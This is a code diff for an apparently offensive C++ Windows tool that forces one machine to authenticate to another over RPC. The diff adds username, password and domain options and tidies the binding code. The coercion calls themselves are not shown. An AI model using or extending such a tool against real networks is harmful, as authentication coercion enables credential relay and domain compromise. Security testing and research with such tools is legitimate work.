@@ -2,8 +2,6 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <SDKDDKVer.h>
-#include <Windows.h>
-#include "ImpersonateUser.h"
 #include "RpcUtils/Utils.hpp"
 #include "ArgumentsParser/ArgumentsParser.h"
 
@@ -19,6 +17,11 @@ ArgumentsParser parseArgs(int argc, char* argv[]) {
 	ArgumentsParser parser = ArgumentsParser();
 	parser.add_string_argument("from", "-f", "--from", "", true, "IP or hostname of the machine to coerce to authenticate.");
 	parser.add_string_argument("to", "-t", "--to", "", true, "IP or hostname of the machine receiving the coerced authentication.");
+	
+	parser.add_string_argument("username", "-u", "--username", "", false, "Username to authenticate to the remote machine.");
+	parser.add_string_argument("password", "-p", "--password", "", false, "Password to authenticate to the remote machine.");
+	parser.add_string_argument("domain", "-d", "--domain", "", false, "Windows domain name to authenticate to the machine.");
+	
 	parser.add_boolean_switch_argument("verbose", "-v", "--verbose", false, false, "Verbose mode.");
 	parser.parse_args(argc, argv);
 	return parser;
@@ -55,7 +58,7 @@ handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAdd
 
 	if (RpcStatus != RPC_S_OK) {
 		printf("[!] Error: RpcStringBindingComposeW returned %d\n", RpcStatus);
-		return (0);
+		return 0;
 	}
 	else {
 		if (verbose) {
@@ -67,7 +70,7 @@ handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAdd
 	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hBinding);
 	if (RpcStatus != RPC_S_OK) {
 		printf("[!] Error: RpcBindingFromStringBindingW returned %d\n", RpcStatus);
-		return (0);
+		return 0;
 	}
 	else {
 		if (verbose) {
@@ -79,7 +82,7 @@ handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAdd
 	RpcStatus = RpcStringFreeW(&StringBinding);
 	if (RpcStatus != RPC_S_OK) {
 		printf("[!] Error: RpcStringFreeW returned %d\n", RpcStatus);
-		return (0);
+		return 0;
 	}
 	else {
 		if (verbose) {
@@ -106,7 +109,7 @@ handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAdd
 	}
 	if (RpcStatus != RPC_S_OK) {
 		PrintWin32Error(RpcStatus);
-		return (0);
+		return 0;
 	}
 	else {
 		if (verbose) {
@@ -158,6 +161,12 @@ int main(int argc, char* argv[])
 	std::string listener = std::get<std::string>(parser.get_value("to"));
 	std::wstring listener_w = std::wstring(listener.begin(), listener.end());
 	wchar_t* listener_w_ptr = (wchar_t*)(listener_w.c_str());
+	// Get and convert parser value "username"
+	std::string username = std::get<std::string>(parser.get_value("username"));
+	// Get and convert parser value "password"
+	std::string password = std::get<std::string>(parser.get_value("password"));
+	// Get and convert parser value "domain"
+	std::string domain = std::get<std::string>(parser.get_value("domain"));
 
 	if (verbose) {
 		get_rpc_runtime_version();
